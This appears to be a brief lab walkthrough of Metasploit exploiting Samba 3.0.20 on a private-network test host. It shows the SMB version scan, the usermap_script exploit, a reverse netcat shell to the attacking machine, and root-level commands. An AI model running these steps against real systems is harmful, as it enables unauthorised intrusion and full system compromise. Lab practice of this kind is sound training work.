SMB port exploitation
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

// Searching smb version //
msf6 > search type:auxiliary smb_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version

msf6 > use auxiliary/scanner/smb/smb_version    
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.98.130
RHOSTS => 192.168.98.130
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.98.130:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 192.168.98.130:445    -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 192.168.98.130:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_version) > back
msf6 > 
// With the smb version known we can now know the exploit to use //
msf6 > use  exploit/multi/samba/usermap_script   
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.98.130
RHOSTS => 192.168.98.130
msf6 exploit(multi/samba/usermap_script) > exploit

[*] Started reverse TCP handler on 192.168.98.128:4444 
[*] Command shell session 1 opened (192.168.98.128:4444 -> 192.168.98.130:40763) at 2024-05-24 00:34:03 +0300

// Session created with the target machine //
whoami
root
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz

